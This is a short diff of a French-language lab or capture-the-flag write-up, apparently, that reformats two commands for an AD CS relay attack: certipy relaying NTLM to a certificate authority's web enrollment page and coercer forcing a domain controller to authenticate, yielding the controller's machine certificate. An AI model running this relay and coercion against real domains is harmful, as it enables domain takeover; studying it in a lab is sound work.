@@ -303,14 +303,11 @@ Web Enrollment HTTPS : Disabled ✅
 
 ```bash
 # Terminal 1 — Lancer le relay NTLM vers la CA
-certipy relay -target http://caladan.imperium.local/certsrv/certfnsh.asp \
-  -template 'DomainController'
+certipy relay -target http://caladan.imperium.local/certsrv/certfnsh.asp -template 'DomainController'
 
 # Terminal 2 — Forcer le DC à s'authentifier vers toi (coercion)
 # Options : coercer, printerbug, petitpotam, dfscoerce...
-coercer coerce -u yueh.wellington -p 'PASSWORD' -d imperium.local \
-  --target caladan.imperium.local \
-  --listener-ip <TON_IP>
+coercer coerce -u yueh.wellington -p 'PASSWORD' -d imperium.local --target caladan.imperium.local --listener-ip <TON_IP>
 
 # Résultat : certipy reçoit l'auth du DC, demande un cert à sa place
 # → caladan.pfx (cert du machine account du DC)
